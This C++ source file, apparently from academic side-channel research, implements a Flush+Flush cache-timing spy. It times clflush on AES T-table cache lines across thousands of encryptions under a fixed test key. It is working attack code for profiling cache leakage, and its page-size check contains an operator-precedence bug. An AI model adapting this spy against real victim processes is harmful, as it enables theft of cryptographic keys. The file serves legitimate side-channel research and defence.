/*
  This file is a modified version of aes/ff/spy.cpp of https://github.com/IAIK/flush_flush
*/

#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <map>
#include <vector>
#include <x86intrin.h>
extern "C" {
  #include "../tests/aes.h"
}

// this number varies on different systems
#define MIN_CACHE_HIT_CYCLES (170)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (1000*10)

unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

size_t sum;
size_t scount;

std::map<char*, std::map<size_t, size_t> > timings; // key: address, value: (key: byte, value: time)

char* base;
char* probe;
char* end;

int main()
{
  int fd = open("../tests/aes_core.o", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0) // check if size > 0xFFF
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  }; // 16 bytes
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];

  AES_KEY key_struct;

  private_AES_set_encrypt_key(key, 128, &key_struct);

  unsigned int __A;
  uint64_t min_time = __rdtscp(&__A);
  srand(min_time);
  sum = 0;
  for (size_t byte = 0; byte < 256; byte += 16)
  {
    plaintext[0] = byte;
    //plaintext[1] = byte;
    //plaintext[2] = byte;
    //plaintext[3] = byte;

    AES_encrypt(plaintext, ciphertext, &key_struct);

    // adjust me (decreasing order)
    int te0 = 0x2040;
    int te1 = 0x1c40;
    int te2 = 0x1840;
    int te3 = 0x1440;

    //adjust address range to exclude unwanted lines/tables
    for (probe = base + te3; probe < base + te0 + 64*16; probe += 64) // hardcoded addresses (could be done dynamically)
    {
      size_t count = 0;
      for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
      {
        sched_yield();
        for (size_t j = 1; j < 16; ++j)
          plaintext[j] = rand() % 256;
        
        _mm_clflush(probe);
        _mm_mfence();

        AES_encrypt(plaintext, ciphertext, &key_struct);
        sched_yield();
        size_t time = __rdtscp(&__A);
        _mm_clflush(probe);
        _mm_mfence();
        size_t delta = __rdtscp(&__A) - time;

        if (delta >= MIN_CACHE_HIT_CYCLES
                     + ((probe-base == te3 || probe-base == te2 || probe-base == te1 || probe-base == te0)? 0 : -6))
                     // this is a dirty hack, better: do 1 preprocessing run right after set_encrypt_key, find the 4 cache lines where you don't see
                     // any timing difference at all, these are the 4 offsets where you want to subtract the same slice difference you get from the
                     // histogram (-6 on my machine)
          ++count;
      }
      timings[probe][byte] = count;
    }
  }

  for (auto ait : timings)
  {
    printf("%p", (void*) (ait.first - base));
    for (auto kit : ait.second)
    {
      printf(",%lu", kit.second);
    }
    printf("\n");
  }

  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}

